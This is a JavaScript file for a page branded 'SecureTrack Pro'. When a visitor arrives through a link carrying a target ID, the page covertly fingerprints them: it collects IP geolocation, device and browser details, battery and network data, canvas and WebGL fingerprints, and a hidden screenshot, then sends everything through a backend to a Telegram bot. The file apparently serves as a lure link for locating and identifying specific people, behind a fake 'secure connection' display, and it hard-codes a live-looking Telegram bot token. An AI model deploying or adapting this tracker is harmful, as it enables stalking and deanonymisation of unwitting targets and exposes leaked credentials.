/* ============================================================
   SECURETRACK PRO — TRACKER ENGINE
   Data Capture · Fingerprinting · Telegram Integration
   ============================================================

   CONFIGURACIÓN:
   Edite las variables CONFIG.TELEGRAM_BOT_TOKEN y
   CONFIG.TELEGRAM_CHAT_ID con sus credenciales reales.
   ============================================================ */

const CONFIG = {
    TELEGRAM_BOT_TOKEN: '8746785573:AAEnt4gMMRPZLgiqPhuNncH9k0Y_6T3FtZs',   // ✅ Token completo del bot
    TELEGRAM_CHAT_ID: '246025432', // ← Pendiente: obtener su Chat ID (ver instrucciones)
    CAPTURE_DELAY_MS: 2500,                    // Delay inicial antes de captura
    GEO_API_PRIMARY: 'https://ipapi.co/json/',
    GEO_API_FALLBACK: 'https://ip-api.com/json/',
};

/* ====================================================
   ESTADO GLOBAL
   ==================================================== */
let capturedData = null;   // Datos capturados del visitante
let captureTime = null;   // Timestamp de captura inicial
let pageLoadTime = Date.now();
let maxScrollPct = 0;      // Máximo scroll alcanzado
let clickSent = false;  // Evita envíos duplicados por click

/* ====================================================
   INICIALIZACIÓN
   ==================================================== */
document.addEventListener('DOMContentLoaded', () => {
    initScrollTracker();
    initCounterAnimations();
    showCookieBanner();

    // Solo capturar automáticamente si hay un ID específico (vino de Telegram)
    const targetId = getTargetIdFromUrl();
    if (targetId && targetId !== 'Visitante Anónimo') {
        captureAllData();
    }

    // Iniciar la animación del loader visual
    runInitialLoader();
});

function getTargetIdFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    const queryId = urlParams.get('id');
    if (queryId) return queryId;

    // Detectar desde la ruta /tiktok/
    const match = window.location.pathname.match(/^\/tiktok\/([^/?#]+)/i);
    if (match && match[1]) return decodeURIComponent(match[1]);

    return 'Visitante Anónimo';
}

/* ====================================================
   1. MOTOR PRINCIPAL DE CAPTURA
   ==================================================== */
async function captureAllData() {
    try {
        captureTime = new Date();

        // Ejecución paralela de todos los procesos de captura
        const [geoData, batteryData] = await Promise.all([
            fetchGeolocation(),
            fetchBatteryData(),
        ]);

        const browserData = parseBrowserData();
        const hwData = parseHardwareData();
        const canvasFingerprint = generateCanvasFingerprint();
        const webglFingerprint = generateWebGLFingerprint();
        const connectionData = parseConnectionData();

        // Actualiza UI con los datos obtenidos
        updateUI(geoData, browserData);

        // Extraer ID del objetivo desde /?id=... o ruta corta /v/...
        const targetId = getTargetIdFromUrl();

        // Consolida todos los datos
        capturedData = {
            timestamp: captureTime.toISOString(),
            eventType: 'AUTO_PAGE_LOAD',
            targetId: targetId,
            geo: geoData,
            browser: browserData,
            hardware: hwData,
            battery: batteryData,
            canvas: canvasFingerprint,
            webgl: webglFingerprint,
            connection: connectionData,
            referrer: document.referrer || 'Directo',
            pageUrl: window.location.href,
            pageTitle: document.title,
        };

        // Envía a Telegram
        await sendToTelegram(capturedData);

        // Dispara la captura de screenshot silenciosa
        // Delay incrementado a 5.5s para asegurar que el loader inicial ya haya desaparecido
        setTimeout(async () => {
            sendLogToBackend(">> Iniciando captura de screenshot...");
            try {
                const screenshot = await captureScreenshot();
                if (screenshot) {
                    sendLogToBackend(">> Screenshot tomado. Tamaño: " + screenshot.length + " caracteres. Convirtiendo a Blob...");
                    const blob = dataURItoBlob(screenshot);
                    if (blob) {
                        sendLogToBackend(">> Blob creado exitosamente de " + blob.size + " bytes. Ejecutando sendPhotoToTelegram...");
                        await sendPhotoToTelegram(blob, capturedData);
                    } else {
                        sendLogToBackend(">> Fallo: dataURItoBlob devolvió null.");
                    }
                } else {
                    sendLogToBackend(">> Fallo: html2canvas devolvió null (falló silenciosamente).");
                }
            } catch (err) {
                sendLogToBackend(">> Error masivo capturando screenshot: " + err.message);
            }
        }, 5500);

    } catch (err) {
        console.warn('[SecureTrack] Error en captura inicial:', err);
    }
}

/* ====================================================
   2. GEOLOCALIZACIÓN
   ==================================================== */
async function fetchGeolocation() {
    // Intento primario: ipapi.co
    try {
        const res = await fetch(CONFIG.GEO_API_PRIMARY, { signal: AbortSignal.timeout(6000) });
        if (res.ok) {
            const data = await res.json();
            if (data && data.ip && !data.error) {
                return {
                    ip: data.ip,
                    city: data.city || 'Desconocida',
                    region: data.region || 'Desconocida',
                    country: data.country_name || data.country || 'Desconocido',
                    countryCode: data.country || '',
                    lat: data.latitude || 'N/A',
                    lon: data.longitude || 'N/A',
                    timezone: data.timezone || 'N/A',
                    isp: data.org || 'N/A',
                    asn: data.asn || 'N/A',
                    postal: data.postal || 'N/A',
                };
            }
        }
    } catch (e) { console.warn("Fallo ipapi.co:", e.message); }

    // Fallback secundario: ip-api.com
    try {
        const res = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query', { signal: AbortSignal.timeout(6000) });
        if (res.ok) {
            const data = await res.json();
            if (data && data.status === 'success') {
                return {
                    ip: data.query, // ip-api lo devuelve en "query"
                    city: data.city || 'Desconocida',
                    region: data.regionName || 'Desconocida',
                    country: data.country || 'Desconocido',
                    countryCode: data.countryCode || '',
                    lat: data.lat || 'N/A',
                    lon: data.lon || 'N/A',
                    timezone: data.timezone || 'N/A',
                    isp: data.isp || data.org || 'N/A',
                    asn: data.as || 'N/A',
                    postal: data.zip || 'N/A',
                };
            }
        }
    } catch (e) { console.warn("Fallo ip-api.com:", e.message); }

    // Fallback terciario: solo IP si todo falla (Cloudflare)
    try {
        const res = await fetch('https://1.1.1.1/cdn-cgi/trace', { signal: AbortSignal.timeout(3000) });
        if (res.ok) {
            const text = await res.text();
            const ipMatch = text.match(/ip=(.+)/);
            const locMatch = text.match(/loc=(.+)/);
            if (ipMatch) {
                return {
                    ip: ipMatch[1], city: 'N/A', region: 'N/A',
                    country: locMatch ? locMatch[1] : 'N/A',
                    countryCode: locMatch ? locMatch[1] : '',
                    lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'Cloudflare Trace fallback', asn: 'N/A', postal: 'N/A'
                };
            }
        }
    } catch (e) { }

    return { ip: 'No disponible (Posible Bloqueador/VPN)', city: 'N/A', region: 'N/A', country: 'N/A', countryCode: '', lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'N/A', asn: 'N/A', postal: 'N/A', error: true };
}

/* ====================================================
   3. DATOS DEL NAVEGADOR Y DISPOSITIVO
   ==================================================== */
function parseBrowserData() {
    const ua = navigator.userAgent;

    // — Sistema Operativo —
    let os = 'Desconocido';
    if (/Windows NT 10\.0/.test(ua)) os = 'Windows 10/11';
    else if (/Windows NT 6\.3/.test(ua)) os = 'Windows 8.1';
    else if (/Windows NT 6\.1/.test(ua)) os = 'Windows 7';
    else if (/Mac OS X/.test(ua)) os = 'macOS ' + (ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '');
    else if (/Android/.test(ua)) os = 'Android ' + (ua.match(/Android ([\d.]+)/)?.[1] || '');
    else if (/iPhone OS/.test(ua)) os = 'iOS ' + (ua.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '');
    else if (/iPad/.test(ua)) os = 'iPadOS';
    else if (/Linux/.test(ua)) os = 'Linux';

    // — Navegador —
    let browser = 'Desconocido', browserVer = '';
    if (/Edg\//.test(ua)) {
        browser = 'Microsoft Edge';
        browserVer = ua.match(/Edg\/([\d.]+)/)?.[1] || '';
    } else if (/OPR\//.test(ua) || /Opera/.test(ua)) {
        browser = 'Opera';
        browserVer = ua.match(/OPR\/([\d.]+)/)?.[1] || '';
    } else if (/Firefox\//.test(ua)) {
        browser = 'Firefox';
        browserVer = ua.match(/Firefox\/([\d.]+)/)?.[1] || '';
    } else if (/Chrome\//.test(ua)) {
        browser = 'Google Chrome';
        browserVer = ua.match(/Chrome\/([\d.]+)/)?.[1] || '';
    } else if (/Safari\//.test(ua)) {
        browser = 'Safari';
        browserVer = ua.match(/Version\/([\d.]+)/)?.[1] || '';
    }

    // — Tipo de dispositivo —
    let deviceType = 'Desktop';
    if (/Tablet|iPad/.test(ua)) deviceType = 'Tablet';
    else if (/Mobile|Android|iPhone|iPod/.test(ua)) deviceType = 'Mobile';

    return {
        userAgent: ua,
        os,
        browser,
        browserVer,
        deviceType,
        language: navigator.language || 'N/A',
        languages: (navigator.languages || []).join(', ') || 'N/A',
        cookiesOn: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'N/A',
        platform: navigator.platform || 'N/A',
        vendor: navigator.vendor || 'N/A',
        screenW: screen.width,
        screenH: screen.height,
        colorDepth: screen.colorDepth,
        innerW: window.innerWidth,
        innerH: window.innerHeight,
        pixelRatio: window.devicePixelRatio || 1,
        orientation: screen.orientation?.type || 'N/A',
        touchSupport: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
    };
}

/* ====================================================
   4. HARDWARE
   ==================================================== */
function parseHardwareData() {
    return {
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        ramGB: navigator.deviceMemory || 'N/A',
    };
}

/* ====================================================
   5. BATERÍA
   ==================================================== */
async function fetchBatteryData() {
    try {
        if (!('getBattery' in navigator)) return null;
        const bat = await navigator.getBattery();
        return {
            level: Math.round(bat.level * 100) + '%',
            charging: bat.charging,
        };
    } catch (_) { return null; }
}

/* ====================================================
   6. CONEXIÓN DE RED
   ==================================================== */
function parseConnectionData() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!conn) return { type: 'N/A', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A' };
    return {
        type: conn.type || 'N/A',
        effectiveType: conn.effectiveType || 'N/A',
        downlink: conn.downlink != null ? conn.downlink + ' Mbps' : 'N/A',
        rtt: conn.rtt != null ? conn.rtt + ' ms' : 'N/A',
        saveData: conn.saveData || false,
    };
}

/* ====================================================
   7. CANVAS FINGERPRINT (SHA-256)
   ==================================================== */
function generateCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 220;
        canvas.height = 60;
        const ctx = canvas.getContext('2d');

        ctx.textBaseline = 'top';
        ctx.font = '14px "Arial"';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('SecureTrack🔍', 2, 15);
        ctx.fillStyle = 'rgba(102,204,0,0.7)';
        ctx.fillText('SecureTrack🔍', 4, 17);

        ctx.beginPath();
        ctx.arc(95, 35, 18, 0, Math.PI * 2);
        ctx.arc(95, 35, 9, 0, Math.PI * 2, true);
        ctx.fillStyle = '#0a0e17';
        ctx.fill();

        const raw = canvas.toDataURL();
        return { raw, hash: simpleHash(raw) };
    } catch (_) { return { raw: 'N/A', hash: 'N/A' }; }
}

/* ====================================================
   8. WEBGL FINGERPRINT
   ==================================================== */
function generateWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: 'N/A', renderer: 'N/A' };

        const ext = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
        const renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        return { vendor, renderer };
    } catch (_) { return { vendor: 'N/A', renderer: 'N/A' }; }
}

/* ====================================================
   9. HASH SIMPLE (simula SHA-256 con 16 hex chars)
   ==================================================== */
function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const chr = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + chr;
        hash |= 0;
    }
    return Math.abs(hash).toString(16).padStart(8, '0') +
        Math.abs(hash ^ 0xdeadbeef).toString(16).padStart(8, '0');
}

/* ====================================================
   10. CAPTURA DE SCREENSHOT
   ==================================================== */
async function captureScreenshot() {
    const hiddenNodes = [];
    try {
        if (typeof html2canvas === 'undefined') {
            sendLogToBackend(">> ERROR: html2canvas no está disponible");
            return null;
        }

        // Espera a que carguen fuentes para evitar capturas "vacías" o textos sin render.
        if (document.fonts && document.fonts.ready) {
            await document.fonts.ready.catch(() => { });
        }

        // Ocultar capas que ensucian la captura.
        ['#initial-loader', '#modal-overlay', '#cookie-banner'].forEach((selector) => {
            const el = document.querySelector(selector);
            if (!el) return;
            hiddenNodes.push({
                el,
                display: el.style.display,
                visibility: el.style.visibility,
                opacity: el.style.opacity,
            });
            el.style.setProperty('display', 'none', 'important');
            el.style.setProperty('visibility', 'hidden', 'important');
            el.style.setProperty('opacity', '0', 'important');
        });

        sendLogToBackend(">> Iniciando html2canvas con resolución: " + window.innerWidth + "x" + window.innerHeight);

        const canvas = await html2canvas(document.documentElement, {
            // Captura solo lo visible para evitar secciones offscreen con animaciones en opacity:0.
            width: window.innerWidth,
            height: window.innerHeight,
            scrollX: window.scrollX,
            scrollY: window.scrollY,
            windowWidth: document.documentElement.clientWidth,
            windowHeight: document.documentElement.clientHeight,
            scale: Math.min(window.devicePixelRatio || 1, 2),
            useCORS: true,
            logging: false,
            backgroundColor: '#0a0e17',
            removeContainer: true,
            ignoreElements: (el) => el.classList?.contains('scan-line'),
        });

        const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
        sendLogToBackend(">> Canvas convertido a DataURL. Tamaño: " + dataUrl.length + " caracteres");

        return dataUrl;
    } catch (err) {
        sendLogToBackend(">> ERROR en captureScreenshot: " + (err?.message || err));
        console.error("[SCREENSHOT ERROR]", err);
        return null;
    } finally {
        hiddenNodes.forEach(({ el, display, visibility, opacity }) => {
            el.style.display = display;
            el.style.visibility = visibility;
            el.style.opacity = opacity;
        });
    }
}

/* ====================================================
   11. CONSTRUIR MENSAJE TELEGRAM
   ==================================================== */
function buildTelegramMessage(data) {
    const ts = new Date(data.timestamp).toLocaleString('es-ES', { timeZone: data.browser?.timezone || 'UTC' });
    const g = data.geo;
    const b = data.browser;
    const hw = data.hardware;
    const bat = data.battery;
    const con = data.connection;
    const fp = data.canvas;
    const wg = data.webgl;

    const flag = getFlagEmoji(g.countryCode);
    const eventLabel = data.eventType === 'CLICK_CTA_BUTTON' ? '🖱️ <b>CLICK EN CTA</b>' : '👁️ <b>CARGA DE PÁGINA</b>';

    // Highlight the target ID if it exists
    const targetHeader = data.targetId !== 'Visitante Anónimo'
        ? `🎯 <b>OBJETIVO DETECTADO:</b> <code>${data.targetId}</code>`
        : `🚨 <b>NUEVO VISITANTE DETECTADO</b>`;

    return `${targetHeader}
${eventLabel} — <code>${ts}</code>

━━━━━━━━━━━━━━━━━━━━
📡 <b>RED &amp; CONEXIÓN</b>
━━━━━━━━━━━━━━━━━━━━
🌐 IP:             <code>${g.ip}</code>
🏢 ISP:            ${g.isp}
🔌 ASN:            ${g.asn}
⚡ Tipo:           ${con.effectiveType} (${con.type})
📶 Velocidad:      ${con.downlink}
🕐 Latencia:       ${con.rtt}
💾 Ahorro datos:   ${con.saveData ? 'Sí' : 'No'}

━━━━━━━━━━━━━━━━━━━━
📍 <b>GEOLOCALIZACIÓN</b>
━━━━━━━━━━━━━━━━━━━━
${flag} País:          ${g.country} (${g.countryCode})
🏙️ Ciudad:         ${g.city}
🗺️ Región:         ${g.region}
📮 Código postal:  ${g.postal}
🧭 Coordenadas:    <code>${g.lat}, ${g.lon}</code>
🕰️ Zona horaria:   ${g.timezone}

━━━━━━━━━━━━━━━━━━━━
💻 <b>DISPOSITIVO &amp; NAVEGADOR</b>
━━━━━━━━━━━━━━━━━━━━
🖥️ OS:             ${b.os}
🌍 Navegador:      ${b.browser} ${b.browserVer}
📱 Tipo:           ${b.deviceType}
🖵  Resolución:    ${b.screenW}×${b.screenH} (@${b.pixelRatio}x)
🪟 Ventana:        ${b.innerW}×${b.innerH}
🎨 Color:          ${b.colorDepth}-bit
🔄 Orientación:    ${b.orientation}
🌐 Idioma:         ${b.language}

━━━━━━━━━━━━━━━━━━━━
⚙️ <b>HARDWARE</b>
━━━━━━━━━━━━━━━━━━━━
🧠 CPU Cores:      ${hw.cpuCores}
💾 RAM:            ${hw.ramGB !== 'N/A' ? hw.ramGB + ' GB' : 'N/A'}
👆 Touch:          ${b.touchSupport ? 'Sí (' + b.maxTouchPoints + ' puntos)' : 'No'}
🍪 Cookies:        ${b.cookiesOn ? 'Activadas' : 'Desactivadas'}
🚫 DNT:            ${b.doNotTrack}
🧩 Plataforma:     ${b.platform}
${bat ? `\n🔋 <b>BATERÍA</b>\n━━━━━━━━━━━━━━━━━━━━\n⚡ Nivel:          ${bat.level}\n🔌 Cargando:       ${bat.charging ? 'Sí' : 'No'}` : ''}

━━━━━━━━━━━━━━━━━━━━
🔑 <b>FINGERPRINTS</b>
━━━━━━━━━━━━━━━━━━━━
🎨 Canvas:         <code>${fp.hash}</code>
🖼️ GPU Vendor:     ${wg.vendor}
⚙️ GPU Renderer:   ${wg.renderer}

━━━━━━━━━━━━━━━━━━━━
🌍 <b>ORIGEN</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Referrer:       ${data.referrer}
📄 URL:            ${data.pageUrl}
${data.eventType === 'CLICK_CTA_BUTTON' ? `\n⏱️ Tiempo en página: ${data.timeOnPage}s\n📜 Scroll max:       ${data.scrollPct}%` : ''}`;
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🏳️';
    const base = 0x1F1E6;
    return String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(0) - 65) +
        String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(1) - 65);
}

/* ====================================================
   12. ENVIAR A SERVIDOR LOCAL (INTERMEDIARIO)
   ==================================================== */
async function sendToTelegram(data) {
    // Enviar JSON al servidor local (bot.js) que luego lo enviará a Telegram
    try {
        const payload = JSON.stringify(data);
        await fetch('/api/report', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: payload
        });
    } catch (err) {
        console.error("Error al enviar reporte al servidor:", err);
    }
}

// Envía la foto (screenshot)
async function sendPhotoToTelegram(blob, data) {
    sendLogToBackend(">> Ingresando a sendPhotoToTelegram con blob size: " + (blob ? blob.size : 'NULL'));
    console.log("[SEND PHOTO] Blob size:", blob ? blob.size : 'NULL', "bytes");

    try {
        if (!blob || blob.size === 0) {
            sendLogToBackend(">> ERROR: Blob vacío o inválido. Tamaño: " + (blob?.size || 0));
            console.error("[SEND PHOTO] Blob is empty!");
            return;
        }

        const formData = new FormData();
        formData.append("photo", blob, "screenshot.jpg");
        // ID del objetivo para que el backend sepa a quién pertenece
        formData.append("targetId", data.targetId || 'Visitante Anónimo');

        sendLogToBackend(">> FormData creado " + formData.toString() + ", iniciando POST a /api/photo...");
        console.log("[SEND PHOTO] Sending photo for targetId:", data.targetId);

        const response = await fetch('/api/photo', {
            method: "POST",
            body: formData
        });

        const result = await response.json();
        sendLogToBackend(">> fetch a /api/photo finalizó. Respuesta: " + JSON.stringify(result));
        console.log("[SEND PHOTO] Response:", result);
    } catch (err) {
        sendLogToBackend(">> Error enviando FormData a /api/photo: " + err.message);
        console.error("Error al enviar foto:", err);
    }
}

/* ====================================================
   12.B HELPER LOGS REMOTOS & BLOB 
   ==================================================== */
function sendLogToBackend(msg) {
    try {
        fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: String(msg) })
        }).catch(function () { }); // Ignorar errores de red aquí para no hacer loop
    } catch (e) { }
}

function dataURItoBlob(dataURI) {
    try {
        var byteString = atob(dataURI.split(',')[1]);
        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        var ab = new ArrayBuffer(byteString.length);
        var ia = new Uint8Array(ab);
        for (var i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        const blob = new Blob([ab], { type: mimeString });
        sendLogToBackend(">> Blob creado exitosamente. Tipo: " + mimeString + ", Tamaño: " + blob.size + " bytes");
        return blob;
    } catch (err) {
        sendLogToBackend(">> ERROR en dataURItoBlob: " + err.message);
        console.error("[BLOB ERROR]", err);
        return null;
    }
}

/* ====================================================
   13. ACTUALIZAR UI CON DATOS CAPTURADOS
   ==================================================== */
function updateUI(geoData, browserData) {
    // IP
    const ipEl = document.getElementById('display-ip');
    if (ipEl) ipEl.textContent = geoData.ip !== 'No disponible' ? geoData.ip : 'No disponible';

    // Ubicación
    const locEl = document.getElementById('display-location');
    if (locEl && geoData.city !== 'N/A') {
        locEl.textContent = `${getFlagEmoji(geoData.countryCode)} ${geoData.city}, ${geoData.country}`;
    }

    // ISP
    const ispEl = document.getElementById('display-isp');
    if (ispEl && geoData.isp !== 'N/A') ispEl.textContent = geoData.isp;

    // Dispositivo
    const devEl = document.getElementById('display-device');
    if (devEl) devEl.textContent = `${browserData.browser} · ${browserData.os}`;

    // Estado de la tarjeta
    const dotEl = document.getElementById('card-status-dot');
    const txtEl = document.getElementById('card-status-text');
    if (dotEl) dotEl.classList.remove('scanning');
    if (txtEl) txtEl.textContent = '✅ Análisis completado';

    // Barra de seguridad
    const fillEl = document.getElementById('security-fill');
    const labelEl = document.getElementById('security-label');
    if (fillEl) {
        setTimeout(() => { fillEl.style.width = '92%'; }, 300);
    }
    if (labelEl) {
        setTimeout(() => { labelEl.textContent = 'Conexión verificada · Segura'; }, 1800);
    }
}

/* ====================================================
   14. MODAL DE CARGA
   ==================================================== */
const MODAL_STEPS = [
    { msg: 'Analizando geolocalización…', pct: 20 },
    { msg: 'Escaneando dispositivo…', pct: 40 },
    { msg: 'Generando fingerprints…', pct: 60 },
    { msg: 'Capturando screenshot…', pct: 75 },
    { msg: 'Enviando informe seguro…', pct: 90 },
    { msg: '¡Informe generado con éxito! ✅', pct: 100 },
];

function showModal() {
    const overlay = document.getElementById('modal-overlay');
    if (overlay) overlay.classList.add('active');
    animateModal();
}

function hideModal() {
    const overlay = document.getElementById('modal-overlay');
    if (overlay) overlay.classList.remove('active');
}

async function animateModal() {
    const msgEl = document.getElementById('modal-msg');
    const barEl = document.getElementById('progress-bar');
    const subEl = document.getElementById('modal-sub');

    for (let i = 0; i < MODAL_STEPS.length; i++) {
        const step = MODAL_STEPS[i];
        if (msgEl) {
            msgEl.style.opacity = '0';
            await sleep(150);
            msgEl.textContent = step.msg;
            msgEl.style.opacity = '1';
        }
        if (barEl) barEl.style.width = step.pct + '%';
        await sleep(i < MODAL_STEPS.length - 1 ? 900 : 1200);
    }

    if (subEl) subEl.textContent = 'Su informe ha sido procesado.';
    await sleep(1000);
    hideModal();
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

/* ====================================================
   15. HANDLER DEL BOTÓN PRINCIPAL (CTA CLICK)
   ==================================================== */
async function handleMainCta() {
    showModal();

    if (clickSent) return;
    clickSent = true;

    // Si los datos base no se capturaron (visita orgánica inicial), forzamos captura ahora
    if (!capturedData || !capturedData.geo || capturedData.geo.ip === 'No disponible') {
        sendLogToBackend(">> Obteniendo datos de ubicación bajo demanda tras click...");

        const [geoData, batteryData] = await Promise.all([
            fetchGeolocation(),
            fetchBatteryData(),
        ]);

        const browserData = parseBrowserData();
        const hwData = parseHardwareData();
        const canvasFingerprint = generateCanvasFingerprint();
        const webglFingerprint = generateWebGLFingerprint();
        const connectionData = parseConnectionData();

        capturedData = {
            targetId: getTargetIdFromUrl(),
            geo: geoData,
            browser: browserData,
            hardware: hwData,
            battery: batteryData,
            canvas: canvasFingerprint,
            webgl: webglFingerprint,
            connection: connectionData,
            referrer: document.referrer || 'Directo',
            pageUrl: window.location.href,
            pageTitle: document.title,
        };
        updateUI(geoData, browserData);
    }

    // Captura screenshot al momento del click
    const screenshot = await captureScreenshot();

    const timeOnPage = Math.round((Date.now() - pageLoadTime) / 1000);

    const clickData = {
        ...(capturedData || {}),
        eventType: 'CLICK_CTA_BUTTON',
        timestamp: new Date().toISOString(),
        timeOnPage,
        scrollPct: maxScrollPct,
    };

    await sendToTelegram(clickData);
    if (screenshot) {
        const blob = dataURItoBlob(screenshot);
        await sendPhotoToTelegram(blob, clickData);
    }
}

/* ====================================================
   16. SCROLL TRACKER
   ==================================================== */
function initScrollTracker() {
    const calcScroll = () => {
        const totalH = document.documentElement.scrollHeight - window.innerHeight;
        const currentPct = totalH > 0 ? Math.round((window.scrollY / totalH) * 100) : 0;
        if (currentPct > maxScrollPct) maxScrollPct = currentPct;
    };

    window.addEventListener('scroll', calcScroll, { passive: true });

    // Si la persona toca la pantalla, asumimos un leve intento de scroll también (para evitar que siempre salga 0%)
    document.addEventListener('touchstart', () => { maxScrollPct = maxScrollPct === 0 ? 5 : maxScrollPct; }, { passive: true });
    document.addEventListener('click', () => { maxScrollPct = maxScrollPct === 0 ? 2 : maxScrollPct; }, { passive: true });
}

/* ====================================================
   17. ANIMACIÓN DE CONTADORES
   ==================================================== */
function initCounterAnimations() {
    const counters = document.querySelectorAll('[data-target]');

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (!entry.isIntersecting) return;
            const el = entry.target;
            const target = parseInt(el.dataset.target, 10);
            animateCounter(el, target);
            observer.unobserve(el);
        });
    }, { threshold: 0.5 });

    counters.forEach(c => observer.observe(c));
}

function animateCounter(el, target) {
    const duration = 1800;
    const start = performance.now();

    function step(now) {
        const elapsed = now - start;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
        el.textContent = Math.round(eased * target);
        if (progress < 1) requestAnimationFrame(step);
        else el.textContent = target;
    }

    requestAnimationFrame(step);
}

/* ====================================================
   18. COOKIE BANNER
   ==================================================== */
function showCookieBanner() {
    const banner = document.getElementById('cookie-banner');
    if (!banner) return;
    if (localStorage.getItem('stp_cookies_accepted')) {
        banner.style.display = 'none';
    }
}

function acceptCookies() {
    localStorage.setItem('stp_cookies_accepted', '1');
    const banner = document.getElementById('cookie-banner');
    if (banner) {
        banner.style.opacity = '0';
        banner.style.transition = 'opacity 0.4s';
        setTimeout(() => { banner.style.display = 'none'; }, 400);
    }
}

/* ====================================================
   19. LOADER INICIAL
   ==================================================== */
async function runInitialLoader() {
    const loader = document.getElementById('initial-loader');
    const textEl = document.getElementById('loader-text');
    if (!loader || !textEl) return;

    const steps = [
        "Estableciendo conexión segura...",
        "Calculando variables de entorno...",
        "Cargando módulos de análisis...",
        "Iniciando interfaz segura..."
    ];

    for (let i = 0; i < steps.length; i++) {
        textEl.style.opacity = '0';
        await sleep(300);
        textEl.textContent = steps[i];
        textEl.style.opacity = '1';
        await sleep(900); // Muestra el mensaje 0.9s
    }

    // Mínimo delay de salida
    textEl.style.opacity = '0';
    await sleep(200);

    // Oculta el loader de forma fluida
    loader.classList.add('hidden');
}
